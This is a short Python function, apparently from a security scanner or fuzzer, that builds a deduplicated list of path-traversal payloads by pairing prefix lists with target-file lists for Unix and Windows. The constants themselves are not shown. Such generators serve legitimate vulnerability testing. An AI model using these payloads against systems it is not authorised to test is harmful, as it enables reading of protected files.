def _generate_traversal_payloads():
    seen = set()
    out = []
    for prefix in TRAVERSAL_PREFIXES:
        for target in CORE_TARGETS:
            p = prefix + target
            if p not in seen:
                seen.add(p)
                out.append(p)
    for prefix in BROAD_TRAVERSAL_TECHNIQUES:
        for target in BROAD_TARGETS:
            p = prefix + target
            if p not in seen:
                seen.add(p)
                out.append(p)
    for prefix in WINDOWS_PREFIXES:
        for target in WINDOWS_TARGETS:
            p = prefix + target
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


